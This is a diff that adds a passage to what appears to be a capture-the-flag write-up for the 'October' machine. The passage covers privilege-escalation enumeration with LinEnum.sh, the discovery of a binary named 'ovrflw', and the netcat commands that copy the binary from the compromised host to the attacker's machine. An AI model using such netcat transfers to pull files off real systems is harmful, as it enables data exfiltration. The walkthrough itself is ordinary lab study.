@@ -72,5 +72,13 @@ Running netstat -ntulp, I notice mysql is listening on port 3306
   I login successfully but I obly find dummy users not really helpful there. I need to look deeper.
   
   
+Running a linux privelege escalation script (LinEnum.sh); shows we have an uncommon binary ovrflow as below;
+www-data@october:/usr/local/bin$ ls
+ls
+ovrflw
+So I send this over to my local machine using netcat for further analysis.
+Sender :  └─# nc -w 3 10.10.14.13 1234 < ovrflw
+Receiver : └─# nc -lv -p 1234 > ovrflw
+└─# chmod +x ovrflw
 
 
